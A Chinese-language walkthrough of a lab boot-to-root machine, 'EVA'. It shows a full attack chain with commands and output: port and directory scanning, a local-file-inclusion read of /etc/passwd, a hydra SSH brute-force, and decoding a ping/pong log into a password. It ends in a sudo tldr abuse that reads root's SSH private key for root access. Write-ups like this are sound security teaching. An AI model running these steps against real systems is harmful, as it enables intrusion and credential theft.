![image-20250608102554020](https://7r1umph.top/image/20250608102601444.webp)

打坤打坤

探测ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l                                      
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.130 08:00:27:9c:35:56       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.044 seconds (125.24 hosts/sec). 4 responded
                       
```

靶机ip 192.168.205.130，探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- 192.168.205.130            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:27 EDT
Nmap scan report for 192.168.205.130
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,80 -sC -sV 192.168.205.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:28 EDT
Nmap scan report for 192.168.205.130
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: \xE2\x9D\x80 \xE9\xBE\x8D \xC2\xB7 \xE8\xA6\xBA\xE9\x86\x92 \xE2\x9D\x80
MAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds

```

常规，看web

![1](https://7r1umph.top/image/20250608102947610.webp)

一个关于《龙族》的页面
扒拉了一下源代码，没有什么

目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ dirsearch -u http://192.168.205.130/                                
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/hgfs/gx/reports/http_192.168.205.130/__25-06-07_22-30-53.txt

Target: http://192.168.205.130/

[22:30:53] Starting: 
[22:30:54] 403 -  280B  - /.ht_wsr.txt
[22:30:54] 403 -  280B  - /.htaccess.bak1
[22:30:54] 403 -  280B  - /.htaccess.orig
[22:30:54] 403 -  280B  - /.htaccess.sample
[22:30:54] 403 -  280B  - /.htaccess.save
[22:30:54] 403 -  280B  - /.htaccess_extra
[22:30:54] 403 -  280B  - /.htaccess_sc
[22:30:54] 403 -  280B  - /.htaccess_orig
[22:30:54] 403 -  280B  - /.htaccessBAK
[22:30:54] 403 -  280B  - /.htaccessOLD
[22:30:54] 403 -  280B  - /.htaccessOLD2
[22:30:54] 403 -  280B  - /.htm
[22:30:54] 403 -  280B  - /.html
[22:30:54] 403 -  280B  - /.htpasswd_test
[22:30:54] 403 -  280B  - /.htpasswds
[22:30:54] 403 -  280B  - /.httr-oauth
[22:30:54] 403 -  280B  - /.php
[22:31:14] 403 -  280B  - /server-status
[22:31:14] 403 -  280B  - /server-status/

Task Completed
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://192.168.205.130/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.130/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 12224]
/dragon.php           (Status: 200) [Size: 10284]
Progress: 76819 / 1102800 (6.97%)
```

探测到一个/dragon.php，先看看
![image-20250608103236313](https://7r1umph.top/image/20250608103236778.webp)

有四个言灵，扒拉一下源代码
源代码重点

```
<div class="incantation-name" data-name="divinedecree">
                DivineDecree
                <div class="tooltip">
                    <div class="tooltip-title">DIVINE DECREE</div>
                    <div class="tooltip-desc">
                        The holy light that illuminates all truth. This ability allows access to all knowledge and secrets.<br><br>
                        ⚠️ WARNING: DivineDecree can reveal and read ALL content without restrictions. Handle with extreme care!
                    </div>
                </div>
            </div>
```

"⚠️ 警告：DivineDecree 可以不受限制地显示和阅读所有内容。请格外小心！"

提示我们是一个LFI，然后它按钮确实是发包了

```
<form method="post">
            <input 
                type="text" 
                name="incantation" 
                id="incantation-input"
                class="incantation-input" 
                placeholder="Enter Incantation..." 
                autocomplete="off"
            >
```

所以大概拼接一下incantation=DivineDecree

burp抓一下

```
POST /dragon.php HTTP/1.1
Host: 192.168.205.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://192.168.205.130
Connection: keep-alive
Referer: http://192.168.205.130/dragon.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

incantation=divinedecree
```

发包没有任何变化，但是它都提醒是LFI了所以FUZZ一下

两个方案

你可以拿burp intruder fuzz

或者拿wfuzz fuzz，我演示wfuzz

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd" -X POST -d "incantation=divinedecree" --hh 10213
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                           
=====================================================================

000000759:   200        347 L    917 W      11711 Ch    "file"                                                                                                            
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 1097
Filtered Requests: 1096
Requests/sec.: 0
```

curl一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wget http://192.168.205.130/dragon.php                                                                              
--2025-06-07 22:42:08--  http://192.168.205.130/dragon.php
Connecting to 192.168.205.130:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘dragon.php’

dragon.php                                       [ <=>                                                                                          ]  10.04K  --.-KB/s    in 0s      

2025-06-07 22:42:08 (370 MB/s) - ‘dragon.php’ saved [10284]

                     
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://192.168.205.130/dragon.php?file=../../../etc/passwd -X POST -d "incantation=divinedecree" -o 1.php                
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11893    0 11869  100    24  2658k   5504 --:--:-- --:--:-- --:--:-- 2903k
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ diff dragon.php 1.php                                               
229c229,258
<                 
---
>         root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
> sys:x:3:3:sys:/dev:/usr/sbin/nologin
> sync:x:4:65534:sync:/bin:/bin/sync
> games:x:5:60:games:/usr/games:/usr/sbin/nologin
> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
> _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
> systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
> systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
> systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
> messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
> sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
> Fingal:x:1000:1000::/home/Fingal:/bin/sh
> lumingfei:x:1001:1001::/home/lumingfei:/usr/sbin/nologin
> uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
>         
>                     <div class="effect divinedecree-effect" style="z-index: 5;"></div>

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ diff dragon.php 1.php |grep "bash"
>         root:x:0:0:root:/root:/bin/bash
> uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
              
```

拿到一个uesugierii用户，看有没有ssh私钥

没有，拿去hydra吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l uesugierii -P 5000q.txt ssh://192.168.205.130 -I -u -f -e nsr -t 64                            
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-07 22:45:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.130:22/
[22][ssh] host: 192.168.205.130   login: uesugierii   password: sakura
[STATUS] attack finished for 192.168.205.130 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-07 22:45:36
                            
```

uesugierii:sakura，ssh登录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh uesugierii@192.168.205.130
The authenticity of host '192.168.205.130 (192.168.205.130)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (1 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.130' (ED25519) to the list of known hosts.
uesugierii@192.168.205.130's password: 
Linux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
uesugierii@EVA:~$ id
uid=1002(uesugierii) gid=1002(uesugierii) groups=1002(uesugierii)
```

扒拉信息

```
uesugierii@EVA:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for uesugierii: 
Sorry, user uesugierii may not run sudo on EVA.
uesugierii@EVA:~$ ls -la
total 24
drwx------ 2 uesugierii uesugierii 4096 Jun  6 09:48 .
drwxr-xr-x 5 root       root       4096 Jun  6 09:43 ..
-rw-r--r-- 1 uesugierii uesugierii  220 Jun  6 09:43 .bash_logout
-rw-r--r-- 1 uesugierii uesugierii 3526 Jun  6 09:43 .bashrc
-rw------- 1 uesugierii uesugierii  840 Jun  6 09:48 eva.pinglog
-rw-r--r-- 1 uesugierii uesugierii  807 Jun  6 09:43 .profile
uesugierii@EVA:~$ cat eva.pinglog
ping
pong
ping
ping
ping
pong
pong
ping
ping
pong
pong
ping
pong
ping
ping
pong
ping
pong
pong
ping
pong
pong
pong
ping
ping
pong
pong
ping
ping
pong
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
pong
pong
ping
pong
ping
ping
pong
ping
ping
ping
ping
pong
ping
ping
pong
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
pong
pong
ping
pong
ping
pong
pong
ping
pong
pong
pong
ping
ping
pong
pong
ping
pong
pong
ping
pong
ping
ping
ping
ping
pong
pong
ping
ping
pong
ping
pong
ping
pong
pong
ping
ping
pong
ping
pong
ping
pong
pong
pong
ping
ping
ping
ping
ping
pong
pong
pong
ping
pong
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
pong
pong
ping
ping
```

纯猜谜，ping为0，pong为1

```
uesugierii@EVA:~$ sed 's/ping/0/g; s/pong/1/g' eva.pinglog |tr -d "\n"
010001100110100101101110011001110110000101101100001110100100001001101100011000010110001101101011011100110110100001100101011001010111000001110111011000010110110001101100
```

![image-20250608111738243](https://7r1umph.top/image/20250608111738641.webp)

Fingal:Blacksheepwall

登录

```
EVA:~$ su Fingal
Password: 
$ bash
Fingal@EVA:/home/uesugierii$ id
uid=1000(Fingal) gid=1000(Fingal) groups=1000(Fingal)
```

继续找信息

```
Fingal@EVA:/home/uesugierii$ cd ~
Fingal@EVA:~$ ls -la
total 32
drwx------ 2 Fingal Fingal 4096 Jun  6 10:48 .
drwxr-xr-x 5 root   root   4096 Jun  6 09:43 ..
lrwxrwxrwx 1 root   root      9 Jun  6 09:12 .bash_history -> /dev/null
-rw-r--r-- 1 Fingal Fingal  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 Fingal Fingal 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 Fingal Fingal  156 Jun  6 09:13 kernel.txt
-rw-r--r-- 1 Fingal Fingal  807 Apr 18  2019 .profile
-rw------- 1 Fingal Fingal   23 Jun  6 10:48 Ricardo.M.Lu
-rw-r--r-- 1 root   root     48 Jun  6 09:12 user.txt
Fingal@EVA:~$ cat kernel.txt 
1. Lu Mingfei's safety is the top priority
2. Immediate rescue operation when Lu Mingfei's life is endangered
3. All rules are unmodifiable and irrevocable
Fingal@EVA:~$ cat Ricardo.M.Lu 
lumingfei:DivineDecree
Fingal@EVA:~$ cat user.txt 
flag{user-da00c95d-42d7-11f0-a8f0-000c2955ba04}
```

kernel.txt 文件是关键，这里需要一点龙族的知识

诺玛是一个超级计算机，他的核心代码写入了保护路明非，kernel.txt是他的规则

1. 路明非的安全至上
2. 路明非生命受到威胁时，立即展开救援行动
3. 所有规则均不可更改且不可撤销

扒拉一个pspy过来，看看是不是有迹可循

```
Fingal@EVA:~$ busybox wget 192.168.205.206/pspy64
Connecting to 192.168.205.206 (192.168.205.206:80)
pspy64               100% |***********************************************************************************************************************************| 3032k  0:00:00 ETA
Fingal@EVA:~$ chmod +x pspy64 
Fingal@EVA:~$ ./pspy64 
2025/06/07 23:21:52 CMD: UID=0     PID=3558   | /bin/bash /usr/local/bin/dragon_rule 
2025/06/07 23:21:52 CMD: UID=0     PID=3559   | sudo usermod -s /usr/sbin/nologin lumingfei 
```

关键的两句，他先执行了/usr/local/bin/dragon_rule ，然后以管理员权限修改用户，将登录 Shell 为 `/usr/sbin/nologin`，即禁止该用户登录系统。

瞄眼看能不能看dragon_rule 

```
Fingal@EVA:~$ ls -la /usr/local/bin/dragon_rule
-rwx------ 1 root root 784 Jun  6 09:15 /usr/local/bin/dragon_rule
```

不能拿等拿了root再看吧

```
Fingal@EVA:~$ su lumingfei
Password: 
This account is currently not available.
```

确实登录不了，其实处理方法很简单，我猜测dragon_rule是一个监听文本的脚本，监听的就是kernel.txt，所以，如果这个文件没有了，他就挂掉了

```
Fingal@EVA:~$ mv kernel.txt kernel.txt.bak
Fingal@EVA:~$ su lumingfei
Password: 
lumingfei@EVA:/home/Fingal$ id
uid=1001(lumingfei) gid=1001(lumingfei) groups=1001(lumingfei)
```

继续找信息

```
lumingfei@EVA:/home/Fingal$ cd 
lumingfei@EVA:~$ ls -al
total 20
drwx------ 2 lumingfei lumingfei 4096 Jun  6 09:12 .
drwxr-xr-x 5 root      root      4096 Jun  6 09:43 ..
-rw-r--r-- 1 lumingfei lumingfei  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 lumingfei lumingfei 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 lumingfei lumingfei  807 Apr 18  2019 .profile
lumingfei@EVA:~$ sudo -l
Matching Defaults entries for lumingfei on EVA:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lumingfei may run the following commands on EVA:
    (ALL) NOPASSWD: /usr/local/bin/tldr
```

能执行tldr，如果你经常看群主的视频，你就会非常熟悉tldr，他喜欢拿tldr看socat的语句，示范一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr 
Command 'tldr' not found, but can be installed with:
sudo apt install tealdeer
Do you want to install it? (N/y)y
sudo apt install tealdeer
[sudo] password for kali: 
The following packages were automatically installed and are no longer required:
  docker-buildx-plugin  docker-ce-rootless-extras  docker-compose-plugin  libslirp0  slirp4netns
Use 'sudo apt autoremove' to remove them.

Installing:
  tealdeer

Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 0
  Download size: 967 kB
  Space needed: 2,761 kB / 91.0 GB available

Get:1 https://mirrors.aliyun.com/kali kali-rolling/main amd64 tealdeer amd64 1.7.2-1+b1 [967 kB]
Fetched 967 kB in 1s (1,107 kB/s)
Selecting previously unselected package tealdeer.
(Reading database ... 474779 files and directories currently installed.)
Preparing to unpack .../tealdeer_1.7.2-1+b1_amd64.deb ...
Unpacking tealdeer (1.7.2-1+b1) ...
Setting up tealdeer (1.7.2-1+b1) ...
Processing triggers for kali-menu (2025.2.7) ...
Processing triggers for man-db (2.13.1-1) ...
                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr socat               
Error: Page cache not found. Please run `tldr --update` to download the cache.

Note: You can optionally enable automatic cache updates by adding the
following config to your config file:

  [updates]
  auto_update = true

The path to your config file can be looked up with `tldr --show-paths`.
To create an initial config file, use `tldr --seed-config`.

You can find more tips and tricks in our docs:

  https://tealdeer-rs.github.io/tealdeer/config_updates.html
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr --update
Successfully created cache directory path `/home/kali/.cache/tealdeer`.
Successfully updated cache.
                                                               
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr socat   

  Multipurpose relay (SOcket CAT).
  More information: <http://www.dest-unreach.org/socat/>.

  Listen to a port, wait for an incoming connection and transfer data to STDIO:

      sudo socat - TCP-LISTEN:8080,fork

  Listen on a port using SSL and print to STDOUT:

      sudo socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT

  Create a connection to a host and port, transfer data in STDIO to connected host:

      sudo socat - TCP4:www.example.com:80

  Forward incoming data of a local port to another host and port:

      sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80

  Send data with multicast routing scheme:

      echo "Hello Multicast" | socat - UDP4-DATAGRAM:224.0.0.1:5000

  Receive data from a multicast:

      socat - UDP4-RECVFROM:5000


```

挺好用的，可以下载试试，回顾正题

看看帮助文档

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr --help
usage: tldr command [options]

Python command line client for tldr

positional arguments:
  command               command to lookup

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  --search "KEYWORDS"   Search for a specific command from a query
  -u, --update, --update_cache
                        Update the local cache of pages and exit
  -k, --clear-cache     Delete the local cache of pages and exit
  -p PLATFORM, --platform PLATFORM
                        Override the operating system [android, freebsd, linux, netbsd, openbsd, osx, sunos, windows, common]
  -l, --list            List all available commands for operating system
  -s SOURCE, --source SOURCE
                        Override the default page source
  -c, --color           Override color stripping
  -r, --render          Render local markdown files
  -L LANGUAGE, --language LANGUAGE
                        Override the default language
  -m, --markdown        Just print the plain page file.
  --short-options       Display shortform options over longform
  --long-options        Display longform options over shortform
  --print-completion {bash,zsh,tcsh}
                        print shell completion script
```

![image-20250608113303243](https://7r1umph.top/image/20250608113303691.webp)

提权的关键

-r, --render 渲染本地markdown 文件

-m, --markdown 仅打印纯文本页面文件。

那直接看root.txt就ok了

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/root.txt
flag{root-da00c95d-42d7-11f0-a8f0-000c2955ba04}
```

看有没有ssh私钥

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_rsa   
```

没有，找ssh配置文件看看，有啥私钥

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /etc/ssh/ssh_config

# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Include /etc/ssh/ssh_config.d/*.conf

Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_dsa
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ecdsa
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF
1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA
AAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ
RIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=
-----END OPENSSH PRIVATE KEY-----

```

扒拉过来本地

```
lumingfei@EVA:~$ vim id
lumingfei@EVA:~$ cat id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF
1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA
AAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ
RIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=
-----END OPENSSH PRIVATE KEY-----

lumingfei@EVA:~$ chmod 600 id 
lumingfei@EVA:~$ ssh root@127.0.0.1 -i id 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun  6 10:46:54 2025 from 192.168.3.94
root@EVA:~# id
uid=0(root) gid=0(root) groups=0(root)
```

扒拉一下脚本，看看怎么实现的

```
root@EVA:~# cat /usr/local/bin/dragon_rule
#!/bin/bash

RULES=(
    "Lu Mingfei's safety is the top priority"
    "Immediate rescue operation when Lu Mingfei's life is endangered"
    "All rules are unmodifiable and irrevocable"
)
verify_rules() {
    for rule in "${RULES[@]}"; do
        if ! grep -qF "$rule" /home/Fingal/kernel.txt; then
            return 1
        fi
    done
    return 0
}
protect_lumingfei() {
    if verify_rules; then
        sudo usermod -s /usr/sbin/nologin lumingfei 2>/dev/null
    else
        sudo usermod -s /bin/bash lumingfei 2>/dev/null
        sudo systemctl stop dragon-monitor 2>/dev/null
        sudo systemctl disable dragon-monitor 2>/dev/null
    fi
}
protect_lumingfei
inotifywait -m -e modify,delete /home/Fingal/kernel.txt 2>/dev/null | while read; do
    protect_lumingfei
done
```

ai生成的逻辑流程图

```
┌──────────────────────────────┐
│ 监听 kernel.txt 修改/删除事件 │
└────────────┬─────────────────┘
             │
             ▼
     ┌────────────────────┐
     │   验证 kernel.txt 内容  │
     └────────────┬─────────┘
                  │
      ┌───────────┴────────────┐
      ▼                        ▼
[ 规则完整 ]           [ 规则不完整 ]
  ↓                            ↓
禁止 lumingfei 登录       允许 lumingfei 登录
保持 dragon-monitor 运行    停止并禁用 dragon-monitor
```

那有个想法，wsl2使用kali的不是天天要修改两个hosts吗？设置一个监听，如果linux hosts有修改就复制去windows hosts，完美解决，哈哈哈，你们自己去尝试吧